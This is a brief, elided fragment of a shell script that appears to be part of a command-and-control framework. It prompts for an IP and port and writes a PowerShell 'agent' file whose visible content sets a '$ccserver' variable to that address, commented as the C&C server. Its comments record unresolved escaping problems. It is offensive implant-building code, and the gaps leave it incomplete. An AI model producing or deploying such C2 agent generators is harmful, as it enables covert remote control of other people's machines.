...
read ip
echo "[+] What is the Port you want to listen on"
read port

configIP=$ip:$port;

echo "[!] Agent Created and saved to ./AgentRequirements/testOutput.ps1"

# Had to create "2" EOF's because on line 109, there's a `'n issue. This is a easy way to fix by appending it twice.
# Still didn't work because it replaces all $variables.. which I don't want
cat > ./AgentRequirements/testOutput.ps1 << EOF
$\variable
\$variable
<#
...
$ccserver = "${configIP}" # IP of C&C server
EOF
